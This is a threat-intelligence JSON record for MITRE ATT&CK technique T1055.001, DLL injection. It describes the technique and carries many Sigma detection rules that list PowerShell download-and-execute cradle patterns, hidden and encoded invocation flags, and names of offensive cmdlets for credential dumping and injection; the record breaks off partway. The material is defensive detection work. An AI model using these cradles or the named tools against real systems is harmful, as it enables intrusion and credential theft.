{
    "id": "T1055.001",
    "name": "Dynamic-link Library Injection",
    "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as `VirtualAllocEx` and `WriteProcessMemory`, then invoked with `CreateRemoteThread` (which calls the `LoadLibrary` API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017)\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of `LoadLibrary`).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017)\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "platforms": "Windows",
    "kill_chain_phases": "Defense Evasion, Privilege Escalation",
    "data_sources": "Process: Process Modification, Module: Module Load, Process: OS API Execution, Process: Process Access",
    "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as `CreateRemoteThread` and those that can be used to modify memory within another process, such as `VirtualAllocEx`/`WriteProcessMemory`, may be used for this technique.(Citation: Elastic Process Injection July 2017)\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.",
    "url": "https://attack.mitre.org/techniques/T1055/001",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1055.001",
                "atomic_attack_guid": "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5",
                "atomic_attack_name": "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "PowerShell Download and Execution Cradles",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Suspicious PowerShell Download and Execute Pattern",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
                        "remote_content": "title: Suspicious PowerShell Download and Execute Pattern\nid: e6c54d94-498c-4562-a37c-b469d8e9a275\nrelated:\n    - id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\n      type: derived\nstatus: test\ndescription: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nreferences:\n    - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70\n    - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-28\nmodified: 2022-03-01\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: # make sure that your backend applies the strings case-insensitive\n            - 'IEX ((New-Object Net.WebClient).DownloadString'\n            - 'IEX (New-Object Net.WebClient).DownloadString'\n            - 'IEX((New-Object Net.WebClient).DownloadString'\n            - 'IEX(New-Object Net.WebClient).DownloadString'\n            - ' -command (New-Object System.Net.WebClient).DownloadFile('\n            - ' -c (New-Object System.Net.WebClient).DownloadFile('\n    condition: selection\nfalsepositives:\n    - Software installers that pull packages from remote systems and execute them\nlevel: high\n"
                    },
                    {
                        "rule_name": "Malicious PowerShell Commandlets - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_malicious_cmdlets.yml",
                        "remote_content": "title: Malicious PowerShell Commandlets - ProcessCreation\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nrelated:\n    - id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n      type: derived\n    - id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n      type: similar\nstatus: test\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n    - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n    - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n    - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n    - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n    - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ # Invoke-TotalExec\n    - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/ # Invoke-TotalExec\n    - https://github.com/calebstewart/CVE-2021-1675 # Invoke-Nightmare\n    - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n    - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n    - https://github.com/HarmJ0y/DAMP\n    - https://github.com/samratashok/nishang\n    - https://github.com/DarkCoderSc/PowerRunAsSystem/\n    - https://github.com/besimorhino/powercat\n    - https://github.com/Kevin-Robertson/Powermad\n    - https://github.com/adrecon/ADRecon\n    - https://github.com/adrecon/AzureADRecon\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\nmodified: 2024-01-25\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1482\n    - attack.t1087\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1069\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: Please ensure alphabetical order when adding new entries\n        CommandLine|contains:\n            - 'Add-Exfiltration'\n            - 'Add-Persistence'\n            - 'Add-RegBackdoor'\n            - 'Add-RemoteRegBackdoor'\n            - 'Add-ScrnSaveBackdoor'\n            - 'Check-VM'\n            - 'ConvertTo-Rc4ByteStream'\n            - 'Decrypt-Hash'\n            - 'Disable-ADIDNSNode'\n            - 'Disable-MachineAccount'\n            - 'Do-Exfiltration'\n            - 'Enable-ADIDNSNode'\n            - 'Enable-MachineAccount'\n            - 'Enabled-DuplicateToken'\n            - 'Exploit-Jboss'\n            - 'Export-ADR'\n            - 'Export-ADRCSV'\n            - 'Export-ADRExcel'\n            - 'Export-ADRHTML'\n            - 'Export-ADRJSON'\n            - 'Export-ADRXML'\n            - 'Find-Fruit'\n            - 'Find-GPOLocation'\n            - 'Find-TrustedDocuments'\n            - 'Get-ADIDNS' # Covers: Get-ADIDNSNodeAttribute, Get-ADIDNSNodeOwner, Get-ADIDNSNodeTombstoned, Get-ADIDNSPermission, Get-ADIDNSZone\n            - 'Get-ApplicationHost'\n            - 'Get-ChromeDump'\n            - 'Get-ClipboardContents'\n            - 'Get-FoxDump'\n            - 'Get-GPPPassword'\n            - 'Get-IndexedItem'\n            - 'Get-KerberosAESKey'\n            - 'Get-Keystrokes'\n            - 'Get-LSASecret'\n            - 'Get-MachineAccountAttribute'\n            - 'Get-MachineAccountCreator'\n            - 'Get-PassHashes'\n            - 'Get-RegAlwaysInstallElevated'\n            - 'Get-RegAutoLogon'\n            - 'Get-RemoteBootKey'\n            - 'Get-RemoteCachedCredential'\n            - 'Get-RemoteLocalAccountHash'\n            - 'Get-RemoteLSAKey'\n            - 'Get-RemoteMachineAccountHash'\n            - 'Get-RemoteNLKMKey'\n            - 'Get-RickAstley'\n            - 'Get-Screenshot'\n            - 'Get-SecurityPackages'\n            - 'Get-ServiceFilePermission'\n            - 'Get-ServicePermission'\n            - 'Get-ServiceUnquoted'\n            - 'Get-SiteListPassword'\n            - 'Get-System'\n            - 'Get-TimedScreenshot'\n            - 'Get-UnattendedInstallFile'\n            - 'Get-Unconstrained'\n            - 'Get-USBKeystrokes'\n            - 'Get-VaultCredential'\n            - 'Get-VulnAutoRun'\n            - 'Get-VulnSchTask'\n            - 'Grant-ADIDNSPermission'\n            - 'Gupt-Backdoor'\n            - 'HTTP-Login'\n            - 'Install-ServiceBinary'\n            - 'Install-SSP'\n            - 'Invoke-ACLScanner'\n            - 'Invoke-ADRecon'\n            - 'Invoke-ADSBackdoor'\n            - 'Invoke-AgentSmith'\n            - 'Invoke-AllChecks'\n            - 'Invoke-ARPScan'\n            - 'Invoke-AzureHound'\n            - 'Invoke-BackdoorLNK'\n            - 'Invoke-BadPotato'\n            - 'Invoke-BetterSafetyKatz'\n            - 'Invoke-BypassUAC'\n            - 'Invoke-Carbuncle'\n            - 'Invoke-Certify'\n            - 'Invoke-ConPtyShell'\n            - 'Invoke-CredentialInjection'\n            - 'Invoke-DAFT'\n            - 'Invoke-DCSync'\n            - 'Invoke-DinvokeKatz'\n            - 'Invoke-DllInjection'\n            - 'Invoke-DNSUpdate'\n            - 'Invoke-DomainPasswordSpray'\n            - 'Invoke-DowngradeAccount'\n            - 'Invoke-EgressCheck'\n            - 'Invoke-Eyewitness'\n            - 'Invoke-FakeLogonScreen'\n            - 'Invoke-Farmer'\n            - 'Invoke-Get-RBCD-Threaded'\n            - 'Invoke-Gopher'\n            - 'Invoke-Grouper' # Also Covers Invoke-GrouperX\n            - 'Invoke-HandleKatz'\n            - 'Invoke-ImpersonatedProcess'\n            - 'Invoke-ImpersonateSystem'\n            - 'Invoke-InteractiveSystemPowerShell'\n            - 'Invoke-Internalmonologue'\n            - 'Invoke-Inveigh'\n            - 'Invoke-InveighRelay'\n            - 'Invoke-KrbRelay'\n            - 'Invoke-LdapSignCheck'\n            - 'Invoke-Lockless'\n            - 'Invoke-MalSCCM'\n            - 'Invoke-Mimikatz'\n            - 'Invoke-Mimikittenz'\n            - 'Invoke-MITM6'\n            - 'Invoke-NanoDump'\n            - 'Invoke-NetRipper'\n            - 'Invoke-Nightmare'\n            - 'Invoke-NinjaCopy'\n            - 'Invoke-OfficeScrape'\n            - 'Invoke-OxidResolver'\n            - 'Invoke-P0wnedshell'\n            - 'Invoke-Paranoia'\n            - 'Invoke-PortScan'\n            - 'Invoke-PoshRatHttp' # Also Covers Invoke-PoshRatHttps\n            - 'Invoke-PostExfil'\n            - 'Invoke-PowerDump'\n            - 'Invoke-PowerShellTCP'\n            - 'Invoke-PowerShellWMI'\n            - 'Invoke-PPLDump'\n            - 'Invoke-PsExec'\n            - 'Invoke-PSInject'\n            - 'Invoke-PsUaCme'\n            - 'Invoke-ReflectivePEInjection'\n            - 'Invoke-ReverseDNSLookup'\n            - 'Invoke-Rubeus'\n            - 'Invoke-RunAs'\n            - 'Invoke-SafetyKatz'\n            - 'Invoke-SauronEye'\n            - 'Invoke-SCShell'\n            - 'Invoke-Seatbelt'\n            - 'Invoke-ServiceAbuse'\n            - 'Invoke-ShadowSpray'\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - 'Invoke-Shellcode'\n            - 'Invoke-SMBScanner'\n            - 'Invoke-Snaffler'\n            - 'Invoke-Spoolsample'\n            - 'Invoke-SpraySinglePassword'\n            - 'Invoke-SSHCommand'\n            - 'Invoke-StandIn'\n            - 'Invoke-StickyNotesExtract'\n            - 'Invoke-SystemCommand'\n            - 'Invoke-Tasksbackdoor'\n            - 'Invoke-Tater'\n            - 'Invoke-Thunderfox'\n            - 'Invoke-ThunderStruck'\n            - 'Invoke-TokenManipulation'\n            - 'Invoke-Tokenvator'\n            - 'Invoke-TotalExec'\n            - 'Invoke-UrbanBishop'\n            - 'Invoke-UserHunter'\n            - 'Invoke-VoiceTroll'\n            - 'Invoke-Whisker'\n            - 'Invoke-WinEnum'\n            - 'Invoke-winPEAS'\n            - 'Invoke-WireTap'\n            - 'Invoke-WmiCommand'\n            - 'Invoke-WMIExec'\n            - 'Invoke-WScriptBypassUAC'\n            - 'Invoke-Zerologon'\n            - 'MailRaider'\n            - 'New-ADIDNSNode'\n            - 'New-DNSRecordArray'\n            - 'New-HoneyHash'\n            - 'New-InMemoryModule'\n            - 'New-MachineAccount'\n            - 'New-SOASerialNumberArray'\n            - 'Out-Minidump'\n            - 'Port-Scan'\n            - 'PowerBreach'\n            - 'powercat '\n            - 'PowerUp'\n            - 'PowerView'\n            - 'Remove-ADIDNSNode'\n            - 'Remove-MachineAccount'\n            - 'Remove-Update'\n            - 'Rename-ADIDNSNode'\n            - 'Revoke-ADIDNSPermission'\n            - 'Set-ADIDNSNode' # Covers: Set-ADIDNSNodeAttribute, Set-ADIDNSNodeOwner\n            - 'Set-MacAttribute'\n            - 'Set-MachineAccountAttribute'\n            - 'Set-Wallpaper'\n            - 'Show-TargetScreen'\n            - 'Start-CaptureServer'\n            - 'Start-Dnscat2'\n            - 'Start-WebcamRecorder'\n            - 'VolumeShadowCopyTools'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    },
                    {
                        "rule_name": "PowerShell Web Download",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PowerShell Download Pattern",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Potential WinAPI Calls Via CommandLine",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_inline_win_api_access.yml",
                        "remote_content": "title: Potential WinAPI Calls Via CommandLine\nid: ba3f5c1b-6272-4119-9dbd-0bc8d21c2702\nrelated:\n    - id: 03d83090-8cba-44a0-b02f-0b756a050306\n      type: derived\nstatus: test\ndescription: Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec\nreferences:\n    - https://twitter.com/m417z/status/1566674631788007425\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-06\nmodified: 2023-01-09\ntags:\n    - attack.execution\n    - attack.t1106\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'AddSecurityPackage'\n            - 'AdjustTokenPrivileges'\n            - 'Advapi32'\n            - 'CloseHandle'\n            - 'CreateProcessWithToken'\n            - 'CreatePseudoConsole'\n            - 'CreateRemoteThread'\n            - 'CreateThread'\n            - 'CreateUserThread'\n            - 'DangerousGetHandle'\n            - 'DuplicateTokenEx'\n            - 'EnumerateSecurityPackages'\n            - 'FreeHGlobal'\n            - 'FreeLibrary'\n            - 'GetDelegateForFunctionPointer'\n            - 'GetLogonSessionData'\n            - 'GetModuleHandle'\n            - 'GetProcAddress'\n            - 'GetProcessHandle'\n            - 'GetTokenInformation'\n            - 'ImpersonateLoggedOnUser'\n            - 'kernel32'\n            - 'LoadLibrary'\n            - 'memcpy'\n            - 'MiniDumpWriteDump'\n            # - 'msvcrt'\n            - 'ntdll'\n            - 'OpenDesktop'\n            - 'OpenProcess'\n            - 'OpenProcessToken'\n            - 'OpenThreadToken'\n            - 'OpenWindowStation'\n            - 'PtrToString'\n            - 'QueueUserApc'\n            - 'ReadProcessMemory'\n            - 'RevertToSelf'\n            - 'RtlCreateUserThread'\n            - 'secur32'\n            - 'SetThreadToken'\n            # - 'user32'\n            - 'VirtualAlloc'\n            - 'VirtualFree'\n            - 'VirtualProtect'\n            - 'WaitForSingleObject'\n            - 'WriteInt32'\n            - 'WriteProcessMemory'\n            - 'ZeroFreeGlobalAllocUnicode'\n    filter_optional_mpcmdrun:\n        Image|endswith: '\\MpCmdRun.exe'\n        CommandLine|contains: 'GetLoadLibraryWAddress32'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Any Powershell DownloadString",
                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "e6474a1b-5390-49cd-ab41-8d88655f7394",
                    "4f73421b-5a0b-4bbf-a892-5a7fb99bea66",
                    "d1aa3382-abab-446f-96ea-4de52908210b",
                    "abfb5a93-e695-4ee9-bc10-541290bcd663",
                    "148431ce-4b70-403d-8525-fcc2993f29ea",
                    "6309645e-122d-4c5b-bb2b-22e4f9c2fa42",
                    "17eb8e57-9983-420d-ad8a-2c4976c22eb8",
                    "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
                    "340a090b-c4e9-412e-bb36-b4b16fe96f9b",
                    "6345b048-8441-43a7-9bed-541133633d7a",
                    "052ec6f6-1adc-41e6-907a-f1c813478bee",
                    "5f113a8f-8b61-41ca-b90f-d374fa7e4a39",
                    "f4599aa0-4f85-4a32-80ea-fc39dc965945"
                ],
                "lookup_results": [
                    {
                        "uuid": "e6474a1b-5390-49cd-ab41-8d88655f7394",
                        "lookup_data": {
                            "description": "Detects execution of a renamed version of the \"Mavinject\" process. Which can be abused to perform process injection using the \"/INJECTRUNNING\" flag",
                            "raw": "author: frack113, Florian Roth\ndate: 2022/12/05\ndescription: Detects execution of a renamed version of the \"Mavinject\" process. Which\n  can be abused to perform process injection using the \"/INJECTRUNNING\" flag\ndetection:\n  condition: selection and not filter\n  filter:\n    Image|endswith:\n    - \\mavinject32.exe\n    - \\mavinject64.exe\n  selection:\n    OriginalFileName:\n    - mavinject32.exe\n    - mavinject64.exe\nfalsepositives:\n- Unlikely\nid: e6474a1b-5390-49cd-ab41-8d88655f7394\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.004/T1056.004.md\n- https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e\n- https://twitter.com/gN3mes1s/status/941315826107510784\n- https://reaqta.com/2017/12/mavinject-microsoft-injector/\n- https://twitter.com/Hexacorn/status/776122138063409152\n- https://github.com/SigmaHQ/sigma/issues/3742\n- https://github.com/keyboardcrunch/SentinelOne-ATTACK-Queries/blob/6a228d23eefe963ca81f2d52f94b815f61ef5ee0/Tactics/DefenseEvasion.md#t1055-process-injection\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055.001\n- attack.t1218.013\ntitle: Rename Mavinject Execution\n",
                            "sigma:id": "e6474a1b-5390-49cd-ab41-8d88655f7394",
                            "title": "Rename Mavinject Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4f73421b-5a0b-4bbf-a892-5a7fb99bea66",
                        "lookup_data": {
                            "description": "Detects process injection using the signed Windows tool \"Mavinject\" via the \"INJECTRUNNING\" flag",
                            "raw": "author: frack113, Florian Roth\ndate: 2021/07/12\ndescription: Detects process injection using the signed Windows tool \"Mavinject\" via\n  the \"INJECTRUNNING\" flag\ndetection:\n  condition: selection and not filter\n  filter:\n    ParentImage: C:\\Windows\\System32\\AppVClient.exe\n  selection:\n    CommandLine|contains: ' /INJECTRUNNING '\nfalsepositives:\n- Unknown\nid: 4f73421b-5a0b-4bbf-a892-5a7fb99bea66\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/05\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.004/T1056.004.md\n- https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e\n- https://twitter.com/gN3mes1s/status/941315826107510784\n- https://reaqta.com/2017/12/mavinject-microsoft-injector/\n- https://twitter.com/Hexacorn/status/776122138063409152\n- https://github.com/SigmaHQ/sigma/issues/3742\n- https://github.com/keyboardcrunch/SentinelOne-ATTACK-Queries/blob/6a228d23eefe963ca81f2d52f94b815f61ef5ee0/Tactics/DefenseEvasion.md#t1055-process-injection\nrelated:\n- id: 17eb8e57-9983-420d-ad8a-2c4976c22eb8\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055.001\n- attack.t1218.013\ntitle: Mavinject Inject DLL Into Running Process\n",
                            "sigma:id": "4f73421b-5a0b-4bbf-a892-5a7fb99bea66",
                            "title": "Mavinject Inject DLL Into Running Process",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d1aa3382-abab-446f-96ea-4de52908210b",
                        "lookup_data": {
                            "description": "Detects specific process characteristics of Chinese TAIDOOR RAT malware load",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/07/30\ndescription: Detects specific process characteristics of Chinese TAIDOOR RAT malware\n  load\ndetection:\n  condition: selection1 or ( selection2a and selection2b )\n  selection1:\n    CommandLine|contains:\n    - dll,MyStart\n    - dll MyStart\n  selection2a:\n    CommandLine|endswith: ' MyStart'\n  selection2b:\n    CommandLine|contains: rundll32.exe\nfalsepositives:\n- Unknown\nid: d1aa3382-abab-446f-96ea-4de52908210b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://us-cert.cisa.gov/ncas/analysis-reports/ar20-216a\nstatus: test\ntags:\n- attack.execution\n- attack.t1055.001\ntitle: TAIDOOR RAT DLL Load\n",
                            "sigma:id": "d1aa3382-abab-446f-96ea-4de52908210b",
                            "title": "TAIDOOR RAT DLL Load",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "abfb5a93-e695-4ee9-bc10-541290bcd663",
                        "lookup_data": {
                            "description": "Aoqin Dragon | Newly-Discovered Chinese-linked APT Has Been Quietly Spying On Organizations For 10 Years",
                            "link": "http://www.botvrij.eu/data/feed-osint/abfb5a93-e695-4ee9-bc10-541290bcd663.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1655839499",
                            "uuid": "abfb5a93-e695-4ee9-bc10-541290bcd663",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "148431ce-4b70-403d-8525-fcc2993f29ea",
                        "lookup_data": {
                            "description": "Detects potential DLL injection and execution using \"Tracker.exe\"",
